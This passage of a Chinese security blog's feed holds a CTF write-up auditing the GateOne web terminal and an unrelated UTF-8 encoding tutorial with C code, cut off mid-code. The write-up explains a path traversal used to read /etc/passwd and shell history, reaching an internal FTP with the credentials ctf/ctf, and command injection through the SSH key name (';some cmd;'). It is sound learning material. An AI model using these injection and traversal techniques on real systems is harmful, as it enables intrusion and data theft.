class="number">304</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># Finally, deliver the file</span></span><br><span class="line">        <span class="keyword">with</span> io.open(abspath, <span class="string">"rb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line">            hasher = hashlib.sha1()</span><br><span class="line">            hasher.update(data)</span><br><span class="line">            self.set_header(<span class="string">"Etag"</span>, <span class="string">'"%s"'</span> % hasher.hexdigest())</span><br><span class="line">            <span class="keyword">if</span> include_body:</span><br><span class="line">                self.write(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">assert</span> self.request.method == <span class="string">"HEAD"</span></span><br><span class="line">                self.set_header(<span class="string">"Content-Length"</span>, len(data))</span><br></pre></td></tr></table></figure><p>注意关键部分,  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.join(session_dir, session, <span class="string">'downloads'</span>, path)</span><br><span class="line">abspath = os.path.abspath(filepath)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(abspath):</span><br><span class="line">    self.set_status(<span class="number">404</span>)</span><br><span class="line">    self.write(self.get_error_html(<span class="number">404</span>))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(abspath):</span><br><span class="line">    <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">403</span>, <span class="string">"%s is not a file"</span>, path)</span><br></pre></td></tr></table></figure><p>可以看到没有任何的过滤, 就把 <code>path</code> 拼进了 <code>filepath</code>, 存在目录穿越, 可以任意文件读.  </p><p><img src="https://i.loli.net/2019/08/26/JbZuMYALTe7ivFn.png" alt=""></p><p>读 <code>/etc/passwd</code> 找到用户 ctf, 继续 fuzz 一些常用文件, 可以读到 <code>/home/ctf/.bash_history</code>,  </p><p><img src="https://i.loli.net/2019/08/26/5Ay41drtXPIopGT.png" alt=""></p><p>给了 <code>ftp niconiconi</code> 这应该就是题目描述里的内网机器了, 但是我们此时并没有连接 ftp 服务的能力.<br>继续审计源码, 可以发现 <code>gateone/applications/terminal/plugins/ssh/scripts/ssh_connect.py</code> 里的  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> protocol == <span class="string">'telnet'</span>:</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        print(_(<span class="string">'Connecting to telnet://%s@%s:%s'</span> % (user, host, port)))</span><br><span class="line">        <span class="comment"># Set title</span></span><br><span class="line">        print(<span class="string">"\x1b]0;telnet://%s@%s\007"</span> % (user, host))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(_(<span class="string">'Connecting to telnet://%s:%s'</span> % (host, port)))</span><br><span class="line">        <span class="comment"># Set title</span></span><br><span class="line">        print(<span class="string">"\x1b]0;telnet://%s\007"</span> % host)</span><br><span class="line">    telnet_connect(user, host, port)</span><br></pre></td></tr></table></figure><p>可以发现其实支持 <code>telnet</code>, 只是没有写出来…, 而 <code>telnet</code> 基本上跟 <code>nc</code> 差不多, 我们可以手敲 ftp 命令来获取 flag<br>随便试一下, 发现 <code>ctf</code>, <code>ctf</code> 就是账号密码  </p><p><img src="https://i.loli.net/2019/08/26/mhANxTvoCfXYMaQ.png" alt="">  </p><p><img src="https://i.loli.net/2019/08/26/OqzgWR47sx3NED9.png" alt=""></p><p>这里注意 ftp 传输文件还需要开另一个链接, 可以选择客户端链接服务器 (PASV) 或者 服务器链接客户端 (PORT), 这里当然是客户端链接服务器.<br>服务器会返回一个 (ip1, ip2, ip3, ip4, p1, p2), p1 * 256 + p2 就是我们需要链接的端口, 然后用 RERT 命令就能读取文件了.  </p><p>这里还有个小插曲, 这个应用还自带回放功能, 于是可以偷看别人的 flag…</p><p><img src="https://i.loli.net/2019/08/26/7tXZLBCm8nVlvuU.png" alt="">  </p><p>所以我猜后面改题目, 把 flag 设成一半在本机 <code>/flag</code> 上, 一半在内网 ftp 的原因就是这个 2333<br>而且后面又改了一次, 还加了一题 <code>Easy Realworld Challenge 2</code>, 可能就是某位大佬发现的 RCE 导致了非预期  </p><h2 id="Ogeek-Easy-Realworld-Challenge-2"><a href="#Ogeek-Easy-Realworld-Challenge-2" class="headerlink" title="Ogeek Easy Realworld Challenge 2"></a>Ogeek Easy Realworld Challenge 2</h2><p>到我们目前的能力是任意文件读取 + SSRF, 根据题目描述, 应该是得拿到 shell 才能读 flag 了. 于是只能继续审计源码 233  </p><p>可以看到在 ssh 链接时, 是直接拼的命令, 然后放到一个文件里面调用 execvpe 执行 /bin/sh 来跑这个命令, 但是过滤还是很严格的, 没办法注入命令, </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bad_chars</span><span class="params">(chars)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    bad_chars = re.compile(<span class="string">'.*[\$\n\!\;&amp;` |&lt;&gt;].*'</span>)</span><br><span class="line">    <span class="keyword">if</span> bad_chars.match(chars):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> validated:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        url = raw_input(_(</span><br><span class="line">            <span class="string">"[Press Shift-F1 for help]\n\nHost/IP or ssh:// URL%s: "</span> %</span><br><span class="line">            default_host_str))</span><br><span class="line">    <span class="keyword">if</span> bad_chars(url):</span><br><span class="line">        raw_input(invalid_hostname_err)</span><br><span class="line">        url = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">if</span> options.default_host:</span><br><span class="line">            host = options.default_host</span><br><span class="line">            protocol = <span class="string">'ssh'</span></span><br><span class="line">            validated = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            raw_input(invalid_hostname_err)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>但是这个不仅仅有个 ssh 链接的功能, 还能生成 ssh 秘钥,  </p><p><img src="https://i.loli.net/2019/08/26/s7pjlYCm6RLKhPV.png" alt="">  </p><p>我们仔细来看这个 <code>gateone/applications/terminal/plugins/ssh/ssh.py</code> 第 615 行 <code>generate_new_keypair</code>,  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> which(<span class="string">'ssh-keygen'</span>): <span class="comment"># Prefer OpenSSH</span></span><br><span class="line">    openssh_generate_new_keypair(</span><br><span class="line">        self,</span><br><span class="line">        name, <span class="comment"># Name to use when generating the keypair</span></span><br><span class="line">        users_ssh_dir, <span class="comment"># Path to save it</span></span><br><span class="line">        keytype=keytype,</span><br><span class="line">        passphrase=passphrase,</span><br><span class="line">        bits=bits,</span><br><span class="line">        comment=comment</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">elif</span> which(<span class="string">'dropbearkey'</span>):</span><br><span class="line">    dropbear_generate_new_keypair(self,</span><br><span class="line">        name, <span class="comment"># Name to use when generating the keypair</span></span><br><span class="line">        users_ssh_dir, <span class="comment"># Path to save it</span></span><br><span class="line">        keytype=keytype,</span><br><span class="line">        passphrase=passphrase,</span><br><span class="line">        bits=bits,</span><br><span class="line">        comment=comment)</span><br></pre></td></tr></table></figure><p>会判断用的是 openssh 或者 dropbear 来调用对应的秘钥生成命令, 这里肯定是 openssh, 来到 699 行 <code>openssh_generate_new_keypair</code>, 可以看到  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openssh_generate_new_keypair</span><span class="params">(self, name, path,</span></span></span><br><span class="line"><span class="function"><span class="params">        keytype=None, passphrase=<span class="string">""</span>, bits=None, comment=<span class="string">""</span>)</span>:</span></span><br><span class="line">    self.ssh_log.debug(<span class="string">'openssh_generate_new_keypair()'</span>)</span><br><span class="line">    openssh_version = shell_command(<span class="string">'ssh -V'</span>)[<span class="number">1</span>]</span><br><span class="line">    ssh_major_version = int(</span><br><span class="line">        openssh_version.split()[<span class="number">0</span>].split(<span class="string">'_'</span>)[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>])</span><br><span class="line">    key_path = os.path.join(path, name)</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    ssh_keygen_path = which(<span class="string">'ssh-keygen'</span>)</span><br><span class="line">    command = (</span><br><span class="line">        <span class="string">"%s "</span>       <span class="comment"># Path to ssh-keygen</span></span><br><span class="line">        <span class="string">"-b %s "</span>    <span class="comment"># bits</span></span><br><span class="line">        <span class="string">"-t %s "</span>    <span class="comment"># keytype</span></span><br><span class="line">        <span class="string">"-C '%s' "</span>  <span class="comment"># comment</span></span><br><span class="line">        <span class="string">"-f '%s'"</span>   <span class="comment"># Key path</span></span><br><span class="line">        % (ssh_keygen_path, bits, keytype, comment, key_path)</span><br><span class="line">    )</span><br><span class="line">    self.ssh_log.debug(<span class="string">"Keygen command: %s"</span> % command)</span><br><span class="line">    m = self.new_multiplex(command, <span class="string">"gen_ssh_keypair"</span>)</span><br></pre></td></tr></table></figure><p>同样是拼的命令, 不同的是没有了过滤. 因为 name 可控, 最后导致 keypath 可控, 我们只需要注入一个 <code>&#39;;some cmd;&#39;</code> 就能注入我们自己的命令了.  </p><p>这里可以用 Burpsuite 来改 websocket 的内容  </p><p><img src="https://i.loli.net/2019/08/26/wPzJEIvnuGDHyqj.png" alt=""></p><p>然后结合之前的任意文件读取来读命令执行的结果    </p><p><img src="https://i.loli.net/2019/08/26/PctX1T9qjbD7KM2.png" alt=""></p><p>然后就可以发现 flag 啦, 可以直接读. 另外, 除了这个地方还有其他地方也有同样的问题, 这里不再一一举出. </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次 Ogeek 的 web 都挺有意思. 这两题偏向代码审计, 而且如题目名 &lt;code&gt;Easy Realworld&lt;/code&gt;, 都是审计应用本身的漏洞, 差不多就是找 0day 了, 在这里分享给大家.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="audit" scheme="https://rmb122.com/tags/audit/"/>
    
  </entry>
  
  <entry>
    <title>深入理解字符编码</title>
    <link href="https://rmb122.com/2019/08/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
    <id>https://rmb122.com/2019/08/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</id>
    <published>2019-08-06T08:13:47.000Z</published>
    <updated>2019-08-06T11:41:27.152Z</updated>
    
    <content type="html"><![CDATA[<p>以前对 UTF-8, UTF-16, unicode, GBK, ASCII 之类的都是一知半解, 其实深入之后了解这些并不困难.  </p><a id="more"></a><h2 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h2><p>其实这是最简单的, unicode 就是一套标准, 把世界上每个存在的字符 (甚至包括 emoji) 都编一个号, 可以在 <a href="https://unicode-table.com/cn/" target="_blank" rel="noopener">https://unicode-table.com/cn/</a> 看到全部的编码,<br>把这个编的号, 一般叫做 code point, 也就是码点. 同时也设定了几个编码的标准, 也就是 UTF-8, UTF-16 等等, 毕竟直接把码点转二进制太浪费空间了.  </p><p>而这些编码, 就是把这些码点保存为计算机可以识别的二进制形式.  </p><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>UTF-8 就是这些编码的一种, 详细可以参考<a href="https://zh.wikipedia.org/wiki/UTF-8" target="_blank" rel="noopener">维基百科</a>, 简单来说, 就是把码点转为二进制后,<br>然后为了节省空间, 把不同大小的码点转为不同长度的字节序列, 这就是他天才的地方, 用变长编码来节省长度.  </p><p>这里以 <code>啊</code> 为例, 它的码点是 <code>0x554a</code>, 在 <code>U+0800~U+FFFF</code> 的范围内, 二进制是 <code>0b101010101001010</code>,<br>那么根据定义, 他的保存方式是 <code>1110xxxx 10xxxxxx 10xxxxxx</code>, 我们将这个码点的二进制以大端的方式填入其中,<br>得到 <code>1110|0101 10|010101 10|001010</code>, 也就是 <code>b&#39;\xe5\x95\x8a&#39;</code>, 可以尝试在 python 解码, 得到的就是 <code>啊</code>.  </p><p>而在 <code>0x00 ~ 0xFF</code> 范围内, UTF-8 其实就被退化为 ASCII 了, 一是为了兼容性, 二是确实 ASCII 所涵盖的符号, 确实用的非常多.<br>这里可以手动写一些 UTF-8 的函数来加深学习, 因为是变长的, 所以来算长度, 以及截取相对比较麻烦.<br>这里用我用 c 写, 感觉非常的爽, 就像在高速公路上飙车, 控制不好就会翻车 (Segment fault) 233, 但是确实是最接近这些字符编码本来的样子.<br>没有了 python 上各种的包装.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">read_file</span><span class="params">(<span class="keyword">char</span> *filename)</span> </span>&#123;</span><br><span class="line">    FILE *fd = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">    fseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> sz = ftell(fd);</span><br><span class="line">    fseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *content = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * sz);</span><br><span class="line">    fread(content, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), sz, fd);</span><br><span class="line"></span><br><span class="line">    fclose(fd);</span><br><span class="line">    <span class="keyword">return</span> content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8_strlen</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            length += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">codepoint_to_utf8</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> codepoint, <span class="keyword">int</span> *sz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *s;</span><br><span class="line">    <span class="keyword">if</span> (codepoint &lt; <span class="number">0x80</span>) &#123;</span><br><span class="line">        *sz = <span class="number">1</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        *s = codepoint;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x800</span>) &#123;</span><br><span class="line">        *sz = <span class="number">2</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">2</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00011111</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">        *sz = <span class="number">3</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">3</span>);</span><br><span class="line">        *(s + <span class="number">2</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11100000</span> | ((codepoint &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0b00001111</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *sz = <span class="number">4</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">4</span>);</span><br><span class="line">        *(s + <span class="number">3</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">2</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11110000</span> | ((codepoint &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0b00000111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_tail_length</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((c &amp; <span class="number">0b11111000</span>) == <span class="number">0b11110000</span>) &#123;</span><br><span class="line">        length = <span class="number">3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((c &amp; <span class="number">0b11110000</span>) == <span class="number">0b11100000</span>) &#123;</span><br><span class="line">        length = <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((c &amp; <span class="number">0b11100000</span>) == <span class="number">0b11000000</span>) &#123;</span><br><span class="line">        length = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">utf8_substr</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> curr_pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> byte_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *new_s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (curr_pos &lt; start &amp;&amp; *s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            curr_pos += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s += (get_tail_length(*s) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curr_pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (curr_pos &lt; length &amp;&amp; *s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            curr_pos += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s++;</span><br><span class="line">        byte_count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (curr_pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        offset = get_tail_length(*(s - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        new_s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (byte_count + offset + <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(new_s, s - byte_count, byte_count + offset);</span><br><span class="line">        new_s[byte_count + offset] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        new_s = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> new_s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8_to_codepoint</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> codepoint = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*s &amp; <span class="number">0b11111000</span>) == <span class="number">0b11110000</span>) &#123;</span><br><span class="line">        length = <span class="number">4</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*s &amp; <span class="number">0b11110000</span>) == <span class="number">0b11100000</span>) &#123;</span><br><span class="line">        length = <span class="number">3</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b1111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*s &amp; <span class="number">0b11100000</span>) == <span class="number">0b11000000</span>) &#123;</span><br><span class="line">        length = <span class="number">2</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b11111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        length = <span class="number">1</span>;</span><br><span class="line">        codepoint = *s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        s++;</span><br><span class="line">        codepoint &lt;&lt;= <span class="number">6</span>;</span><br><span class="line">        codepoint = codepoint | (*s &amp; <span class="number">0b00111111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> codepoint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    char *content = read_file("/home/rmb122/temp/example.txt");</span></span><br><span class="line"><span class="comment">    printf("%d", utf8_strlen(content));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    free(content);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, utf8_strlen(<span class="string">"一二三四五六一二三四五六1234"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *s;</span><br><span class="line">    <span class="keyword">int</span> sz;</span><br><span class="line"></span><br><span class="line">    s = codepoint_to_utf8(<span class="number">21834</span>, &amp;sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.*s\n"</span>, sz, s);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line"></span><br><span class="line">    s = utf8_substr(<span class="string">"一2三四5六7八9"</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line"></span><br><span class="line">    <span 